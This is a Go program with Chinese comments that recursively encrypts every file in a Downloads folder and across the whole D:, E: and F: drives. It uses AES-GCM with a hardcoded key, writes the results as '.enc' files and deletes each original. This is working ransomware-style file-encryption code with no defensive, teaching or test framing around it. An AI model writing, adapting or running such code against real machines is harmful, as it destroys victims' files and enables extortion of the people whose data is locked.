package main

import (
    "crypto/aes"
    "crypto/cipher"
    "path/filepath"
    "os"
    "io"
    "crypto/rand"
    "fmt" // 用於打印錯誤和路徑
)

func encryptPath(path string, gcm cipher.AEAD) error {
    return filepath.Walk(path, func(filePath string, info os.FileInfo, err error) error {
        if err != nil {
            fmt.Printf("Error accessing path %q: %v\n", filePath, err)
            return err
        }
        // 如果是目錄，跳過
        if !info.IsDir() {
            // 加密文件

            // 讀取文件內容
            original, err := os.ReadFile(filePath)
            if err == nil {
                // 加密內容
                nonce := make([]byte, gcm.NonceSize())
                if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
                    fmt.Printf("Error generating nonce: %v\n", err)
                    return nil
                }
                encrypted := gcm.Seal(nonce, nonce, original, nil)
                // 寫入加密內容
                encryptedPath := filePath + ".enc"
                err = os.WriteFile(encryptedPath, encrypted, 0666)
                if err == nil {
                    os.Remove(filePath) // 刪除原始文件
                } else {
                    fmt.Printf("Error writing encrypted file: %v\n", err)
                }
            } else {
                fmt.Printf("Error reading file %q: %v\n", filePath, err)
            }
        }
        return nil
    })
}

func main() {
    // 初始化 AES-GCM
    key := []byte("zzzzxxxxccccvvvvbbbbnnnn")
    block, err := aes.NewCipher(key)
    if err != nil {
        panic("Error setting up AES")
    }
    gcm, err := cipher.NewGCM(block)
    if err != nil {
        panic("Error setting up GCM")
    }

    // 定義路徑
    path1 := `C:\Users\aaaa\Downloads`
    path2 := `D:\folder1`
    path3 := `D:\`  // 修改為遍歷D:\的每個子資料夾
    path4 := `E:\`
    path5 := `F:\`

    paths := []string{path1, path2, path3, path4, path5}

    for _, path := range paths {
        fmt.Printf("Encrypting path: %s\n", path)
        if err := encryptPath(path, gcm); err != nil {
            fmt.Printf("Error encrypting path %s: %v\n", path, err)
        }
    }
}
